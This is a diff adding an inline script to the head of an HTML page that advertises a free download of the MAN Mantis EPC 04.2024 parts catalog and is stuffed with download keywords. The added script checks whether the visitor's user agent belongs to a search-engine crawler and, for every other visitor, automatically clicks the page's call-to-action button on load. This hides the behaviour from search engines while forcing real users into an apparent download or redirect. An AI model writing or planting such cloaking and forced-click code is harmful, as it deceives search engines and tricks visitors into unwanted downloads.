@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAN Mantis EPC 04.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="MAN Mantis EPC 04.2024 is a comprehensive spare parts catalog for MAN trucks, tractors, and buses available in multiple languages.">
     <meta name="keywords" content="MAN Mantis EPC, MAN Mantis EPC 04.2024, MAN Mantis EPC free download, MAN Mantis EPC 2024, MAN Mantis EPC download, MAN Mantis EPC 2024 free download, MAN Mantis EPC 2024 high speed download, MAN Mantis EPC spare parts catalog, MAN Mantis EPC catalog, catalogue free download, MAN truck spare parts catalog, MAN tractor spare parts catalog, MAN bus spare parts catalog, catalogo de partes de repuesto MAN, Каталог запчастей MAN, МАН каталог запчастин, MAN 지방광고 카탈로그, MAN Mantis EPC каталог, MAN Mantis EPC katalog">
     <style>
